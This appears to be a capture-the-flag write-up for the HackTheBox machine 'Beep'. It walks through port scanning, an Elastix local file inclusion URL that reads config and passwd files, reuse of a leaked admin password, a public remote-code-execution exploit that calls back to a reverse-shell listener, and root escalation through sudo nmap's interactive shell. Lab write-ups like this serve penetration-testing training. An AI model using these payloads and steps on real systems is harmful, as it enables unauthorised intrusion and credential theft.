<h2>Target: 10.10.10.7 Beep </h2>
<b>Initial Access:</b><br>
Step 1:  nmap -Pn 10.10.10.7 --min-rate=5000 -p-|grep open|awk -F '/' '{print $1}'|tr '\n' ','   <br>
Nmap returns open ports: 22,25,80,110,111,143,443,877,993,995,3306,4190,4445,4559,5038,10000 <br><br>

Step 2: Enumerate these open ports further using nmap: nmap -Pn 10.10.10.7 --min-rate=5000 -p 22,25,80,110,111,143,443,877,993,995,3306,4190,4445,4559,5038,10000 -sC -sV -oN nmap-beep

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/6e253ed6-6426-4ab8-9921-3341c08ca159)

Step 3:  Visiting port 80 redirects to port 443 and shows:

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/f182da67-3c80-427d-994e-a8f007cf62c9)

The site shows a login page using elastix.  

Step 4: Google search ‘elastix exploit’ shows:

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/08bf6fc5-69f3-4a23-a591-7767e60b0286)
 
Google returns a lot of articles showing exploits.  Start with the exploit database on the remote command execution as rce is much more interesting than local file inclusion. 

Opening the https://www.exploit-db.com/exploits/18650 shows:

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/e7c6338a-809f-4353-b6b8-9c853d2a5248)
 
Step 5: Download the exploit using the command: searchsploit -m 18650

Update rhost to 10.10.10.7, and lhost to our ip address.  Extension needs to be updated also but we do not know the extension.  If we try the exploit with the default extension of 1000 the exploit fails.  

Step 6: Since we don’t know the extension, move on to the local file inclusion exploit we found earlier in our google search https://www.exploit-db.com/exploits/37637 

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/6aa59ebc-93aa-470d-9bef-387be6d996b7)
  
This shows the exact payload to get lfi.  

Step 7: Navigate to the lfi shown in the exploit database article above: https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../../etc/amportal.conf%00&module=Accounts&action

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/119a855a-08cc-4b69-8d2c-b912843610d4)
   
To make it easier to read, view it through the source code (control+u):

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/88c1e845-e4a3-4e39-95f2-484556438cab)

This shows a username of ‘admin’ and passowrd of ‘jEhdIekWmdjE’.  

Reading further down shows: 

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/e9de66ed-c870-477c-85ed-4b23efda7b33)
 
This shows a /admin directory.

Step 8: Use the local file inclusion to view /etc/passwd:

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/5929205c-135f-4449-8b3c-866e96ceacc3)
 
This shows that there is a username of ‘asterisk’ on the target.

Step 9: Log into the site (port 443) using these credentials.  After login, the site shows:

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/2c6c114a-35c3-4393-a5b9-ba094e5e99c1)
  
Step 10: Visiting the /admin directory automatically redirects to /admin/config.php and shows a login prompt:



![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/8af797dd-3855-43e6-9cbb-3c5d494e59b2)  

Step 11: Reuse the same credentials of ‘admin’ and ‘ jEhdIekWmdjE’ to log into /admin directory.  After logging in the page shows:

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/9f05949c-843d-4766-b809-987fe34db9b0)
  
Step 12: Click on ‘Extensions’ (on the left hand side).  After clicking on ‘Extensions’ the page shows:

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/ddf878f4-e6b8-4a50-8add-2986cd123076)
 
This ‘Extensions’ page shows a valid extension number of 233 (right hand side). 

Step 13: Go back to the rce python script of 18650.py and enter in the extension number of 233.  

Step 14: Open a netcat/pwncat listener to catch the reverse shell: pwncat-cs -lp 443

Step 15: Run the rce exploit: python2 18650.py

We have shell as user ‘asterisk’.  We can get the flag in /home/fanis/user.txt.
___________________________________________
<b>Privilege Escalation:</b><br>
Step 1: Run the command: Sudo -l
 
![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/e31547c9-b3f0-45a6-8426-5881641fe32d)
 
This shows plenty of commands we can run with sudo and we can use many of these to escalate to root.  We will choose /usr/bin/nmap (gtfobins on nmap shows the commands to perform to escalate to root). 

Step 2: Run the command: sudo nmap --interactive

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/0ce1b8cf-5d9b-460e-ac41-39efc68a015a)

This opens nmap in interactive mode.  

Step 3: In the nmap interactive mode run the command: !/bin/bash

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/229530d8-587e-4bcc-8591-f8dff0e5e30d)

We have shell as root.  We can get the flag in /root/root.txt
